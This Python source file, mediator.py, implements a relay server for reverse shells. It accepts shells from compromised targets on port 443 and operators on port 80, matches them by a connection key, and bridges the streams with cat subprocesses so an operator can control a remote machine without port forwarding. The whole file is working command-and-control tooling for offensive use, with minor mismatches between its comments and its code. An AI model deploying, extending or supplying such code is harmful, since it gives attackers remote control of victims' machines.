#!/usr/bin/python3
"""
Program: mediator.py
Author: C.J. May
Description: Bridge two connections to remotely connect an operator to a reverse shell without port forwarding
"""

import argparse
from datetime import datetime, timedelta
import select
from socket import socket, AF_INET, SOCK_STREAM, IPPROTO_TCP, TCP_NODELAY
import subprocess
import threading


class Mediator:
    def __init__(self, logLevel=1):
        # set log level\
        self.logLevel = logLevel
        # create reverse shell socket and bind it to a port
        self.targetServer = socket(AF_INET, SOCK_STREAM)
        self.targetServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.targetServer.bind(("0.0.0.0",443))
        # create operator socket and bind it to a port
        self.operatorServer = socket(AF_INET, SOCK_STREAM)
        self.operatorServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.operatorServer.bind(("0.0.0.0",80))
        # queue and match incoming connections
        self.targets = {}
        self.operators = {}
        # tell sockets to listen on respective ports for a max of 4 connections
        self.targetServer.listen(10)
        self.operatorServer.listen(10)
        self.connCount = 0

    def handleConnections(self):
        # make threads for connection handling and bridging
        targetHandler = threading.Thread(target=self.handleTargets)
        operatorHandler = threading.Thread(target=self.handleOperators)
        bridgeWorker = threading.Thread(target=self.bridgeConnections)
        # run in the background
        targetHandler.daemon = True
        operatorHandler.daemon = True
        bridgeWorker.daemon = True
        # start threads
        targetHandler.start()
        operatorHandler.start()
        bridgeWorker.start()
        # wait for keyboard interrupt
        waiter = threading.Event()
        try:
            waiter.wait()
        except KeyboardInterrupt:
            exit()

    def handleTargets(self):
        while True:
            # wait for reverse shell to connect 
            targetConnection, targetAddress = self.targetServer.accept()
            if self.logLevel >= 2:
                print(f"{datetime.utcnow()} -- Target connection initiated from {targetAddress[0]}")
            targetKey = None
            # get connection key from reverse shell for matching to operator
            ready = select.select([targetConnection], [], [], 10)
            if ready[0]:
                try:
                    targetKey = targetConnection.recv(1024)
                except ConnectionResetError:
                    targetConnection.close()
                    continue
            if not targetKey:
                if self.logLevel >= 2:
                    print(f"{datetime.utcnow()}Z -- No connection key sent by target {targetAddress[0]}... Closing connection")
                targetConnection.close()
                continue
            try:
                if targetKey.decode()[:16] != "#!ConnectionKey_":
                    if self.logLevel >= 2:
                        print(f"{datetime.utcnow()}Z -- Invalid connection key '{targetKey}' sent by target {targetAddress[0]}... Closing connection")
                    targetConnection.close()
                    continue
            except Exception:
                if self.logLevel >= 2:
                    print(f"{datetime.utcnow()}Z -- ERROR: unable to read connection key '{targetKey}' from target {targetAddress[0]}...")
                    continue
            # don't allow duplicate waiting connection keys
            if targetKey.decode() in self.targets:
                if self.logLevel >= 1:
                    print(f"{datetime.utcnow()}Z -- Duplicate target key... Closing connection")
                targetConnection.close()
                continue
            # echo back targetKey and add target to connections queue
            targetConnection.send(targetKey)
            self.targets[targetKey.decode()] = (targetConnection, datetime.utcnow())
            if self.logLevel >= 1:
                print(f"{datetime.utcnow()}Z -- Reverse shell '{targetKey.decode()}' connected from {targetAddress[0]}...")

    def handleOperators(self):
        while True:
            # wait for operator to connect
            operatorConnection, operatorAddress = self.operatorServer.accept()
            if self.logLevel >= 2:
                print(f"{datetime.utcnow()}Z -- Operator connection initiated from {operatorAddress[0]}")
            operatorKey = None
            # get connection key from operator for matching to reverse shell
            ready = select.select([operatorConnection], [], [], 10)
            if ready[0]:
                try:
                    operatorKey = operatorConnection.recv(1024)
                except ConnectionResetError:
                    operatorConnection.close()
                    continue
            if not operatorKey:
                if self.logLevel >= 2:
                    print(f"{datetime.utcnow()}Z -- No connection key sent by operator {operatorAddress[0]}... Closing connection")
                operatorConnection.close()
                continue
            try:
                if operatorKey.decode()[:16] != "#!ConnectionKey_":
                    if self.logLevel >= 2:
                        print(f"{datetime.utcnow()}Z -- Invalid connection key '{operatorKey}' sent by operator {operatorAddress[0]}... Closing connection")
                    operatorConnection.close()
                    continue
            except Exception:
                print(f"{datetime.utcnow()}Z -- ERROR: unable to read connection key '{operatorKey}' from operator {operatorAddress[0]}...")
                continue
            # don't allow duplicate waiting connection keys
            if operatorKey.decode() in self.operators:
                if self.logLevel >= 1:
                    print(f"{datetime.utcnow()}Z -- Duplicate operator key... Sending message and closing connection")
                operatorConnection.send("DUPLICATE".encode())
                operatorConnection.close()
                continue
            # echo back operatorKey and add operator to connections queue
            operatorConnection.send(operatorKey)
            self.operators[operatorKey.decode()] = (operatorConnection, datetime.utcnow())
            if self.logLevel >= 1:
                print(f"{datetime.utcnow()}Z -- Operator '{operatorKey}' connected from {operatorAddress[0]}...")

    def bridgeConnections(self):
        while True:
            # search for matching connection keys
            for connectionKey in list(self.operators):
                if connectionKey in self.targets:
                    # bridge connections with matching keys
                    operatorConnection = self.operators[connectionKey][0]
                    targetConnection = self.targets[connectionKey][0]
                    self.applyBlackMagic(operatorConnection, targetConnection, connectionKey)
                    # remove connections from matching queue
                    self.operators.pop(connectionKey)
                    self.targets.pop(connectionKey)
                    continue
                # close operator connection if timed out (waiting > 15 seconds)
                timeout = timedelta(seconds=30) + self.operators[connectionKey][1]
                if datetime.utcnow() > timeout:
                    if self.logLevel >= 2:
                        print(f"{datetime.utcnow()}Z -- Operator '{connectionKey}' from {self.operators[connectionKey][0].getpeername()[0]} timed out... Closing connection")
                    self.operators[connectionKey][0].close()
                    self.operators.pop(connectionKey)
            # close timed out target connections (waiting > 15 seconds)
            for connectionKey in list(self.targets):
                timeout = timedelta(seconds=30) + self.targets[connectionKey][1]
                if datetime.utcnow() > timeout:
                    if self.logLevel >= 2:
                        print(f"{datetime.utcnow()}Z -- Target '{connectionKey}' from {self.targets[connectionKey][0].getpeername()[0]} timed out... Closing connection")
                    self.targets[connectionKey][0].close()
                    self.targets.pop(connectionKey)

    def applyBlackMagic(self, operatorConnection, targetConnection, connectionKey):
        # connect the streams with GNU black magic
        fromTarget = targetConnection.makefile("rb")
        toTarget = targetConnection.makefile("wb")
        fromOperator = operatorConnection.makefile("rb")
        toOperator = operatorConnection.makefile("wb")
        targetToOperator = subprocess.Popen("cat",
                                            stdin=fromTarget,
                                            stdout=toOperator,
                                            stderr=toOperator)
        operatorToTarget = subprocess.Popen("cat",
                                            stdin=fromOperator,
                                            stdout=toTarget,
                                            stderr=toTarget)
        if self.logLevel >= 1:
            print(f"{datetime.utcnow()}Z -- Operator '{connectionKey}' at {operatorConnection.getpeername()[0]} bridged to target at {targetConnection.getpeername()[0]}... Connection ID {self.connCount}")
        # create thread to gracefully close connection when done
        terminatorThread = threading.Thread(target=self.waitAndTerminate,
                                            args=[targetToOperator,
                                                  operatorToTarget,
                                                  targetConnection,
                                                  operatorConnection,
                                                  self.connCount])
        terminatorThread.daemon = True
        terminatorThread.start()
        self.connCount += 1

    def waitAndTerminate(self, targetToOperator, operatorToTarget, targetSock, operatorSock, connID):
        # close connections when done
        targetToOperator.wait()
        operatorToTarget.wait()
        targetSock.close()
        operatorSock.close()
        # connections terminated
        if self.logLevel >= 1:
            print(f"{datetime.utcnow()}Z -- Connection ID {connID} terminated.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse shell handler client to be used with a mediator server.")
    parser.add_argument("-l", "--log-level",
                        dest="logLevel",
                        action="store",
                        help="detail of logs created by the server (range: 0-2)",
                        default="1")
    args = parser.parse_args()
    try:
        if int(args.logLevel) not in range(0,3):
            raise ValueError
    except ValueError:
        print(f"{datetime.utcnow()}Z -- Error: invalid log level supplied (valid range: 0-2)")
        exit(1)
    server = Mediator(logLevel=args.logLevel)
    server.handleConnections()
